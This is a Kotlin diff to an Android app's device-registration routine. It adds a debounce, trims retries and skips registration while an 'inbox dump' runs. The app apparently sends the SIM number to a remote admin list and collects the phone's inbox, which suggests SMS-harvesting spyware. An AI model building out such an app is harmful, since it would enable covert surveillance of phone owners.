@@ -7,6 +7,10 @@ import android.util.Log
 /** Device / SIM ko live Render API par register karo — Admin list yahi se aati hai. */
 object DeviceRegistration {
     private const val TAG = "DeviceRegistration"
+    private const val DEBOUNCE_MS = 90_000L
+
+    @Volatile
+    private var lastOkAt = 0L
 
     fun register(context: Context) {
         BackgroundSyncRunner.run {
@@ -15,6 +19,15 @@ object DeviceRegistration {
     }
 
     fun registerNow(context: Context): Boolean {
+        if (InboxDump.isRunning()) {
+            Log.d(TAG, "Skip register — inbox dump in progress")
+            return true
+        }
+        val now = System.currentTimeMillis()
+        if (now - lastOkAt in 1 until DEBOUNCE_MS) {
+            return true
+        }
+
         val app = context.applicationContext
         MongoSyncHelper.ensureApiUrl(app)
         SimNumberHelper.ensureSimReadyForSync(app)
@@ -30,15 +43,19 @@ object DeviceRegistration {
         )
 
         var deviceOk = false
-        repeat(5) { attempt ->
+        repeat(2) { attempt ->
+            if (InboxDump.isRunning()) {
+                return true
+            }
             deviceOk = MongoSyncHelper.postApi(app, "/devices/register", payload)
             if (deviceOk) {
+                lastOkAt = System.currentTimeMillis()
                 Log.d(TAG, "Device registered via HTTP: $deviceId / $simNumber")
                 return@repeat
             }
-            if (attempt < 4) {
+            if (attempt < 1) {
                 try {
-                    Thread.sleep(2000L * (attempt + 1))
+                    Thread.sleep(1500L)
                 } catch (_: InterruptedException) {
                     Thread.currentThread().interrupt()
                 }
